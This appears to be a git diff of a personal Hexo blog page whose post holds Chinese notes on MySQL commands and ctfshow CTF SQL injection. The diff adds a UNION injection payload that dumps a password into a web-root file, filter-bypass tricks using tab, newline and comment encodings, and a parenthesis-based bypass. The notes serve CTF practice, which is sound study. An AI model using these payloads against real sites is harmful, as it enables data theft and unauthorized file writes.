@@ -225,63 +225,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/01/My-New-Post/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zhpenghao">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/01/01/My-New-Post/" class="post-title-link" itemprop="url">My New Post</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-01-01 14:25:32" itemprop="dateCreated datePublished" datetime="2023-01-01T14:25:32+08:00">2023-01-01</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/31/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -313,7 +256,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-01-04 22:58:36" itemprop="dateModified" datetime="2023-01-04T22:58:36+08:00">2023-01-04</time>
+                <time title="Modified: 2023-01-05 21:41:08" itemprop="dateModified" datetime="2023-01-05T21:41:08+08:00">2023-01-05</time>
               </span>
 
           
@@ -327,7 +270,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>列出所有数据库</p>
+          <p>[toc]</p>
+<h1 id="mysql-指令"><a href="#mysql-指令" class="headerlink" title="mysql 指令"></a>mysql 指令</h1><p>列出所有数据库</p>
 <p>show datebases  </p>
 <p>查看某个数据库里所有的表</p>
 <p>use datebasename</p>
@@ -343,9 +287,8 @@
 <p>create table tl(id int);#创建一个表</p>
 <p>drop table tl;#删除一个表</p>
 <p>insert into tl values (1,”zhangsan”)</p>
-<p>sqlmap 指令</p>
-<p>union 联合注入</p>
-<p>1’ union select 1,password from ctfshow_user5 where username&#x3D;’flag’ into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;ctf.txt’ – A#生成并保存在网页目录下ctf.txt文件#ctfshowweb175</p>
+<p>[toc]</p>
+<h2 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h2><p>1’ union select 1,password from ctfshow_user5 where username&#x3D;’flag’ into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;ctf.txt’ – A#生成并保存在网页目录下ctf.txt文件#ctfshowweb175</p>
 <p>  if(!preg_match(‘&#x2F;[\x00-\x7f]&#x2F;i’, json_encode($ret))){<br>      $ret[‘msg’]&#x3D;’查询成功’;<br>    }<br>sql 字符注入绕过 空格 %09(tab) %20( )注释绕过&#x2F;**&#x2F;%0a%0b%0c</p>
 <p> return preg_match(‘&#x2F; |*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|#|file|into|select&#x2F;i’, $str);<br>%23(#) </p>
 <p>-1’or(id&#x3D;26)and’a’&#x3D;’a           #括号绕过空格 ctfshow180</p>
@@ -430,7 +373,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">2</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
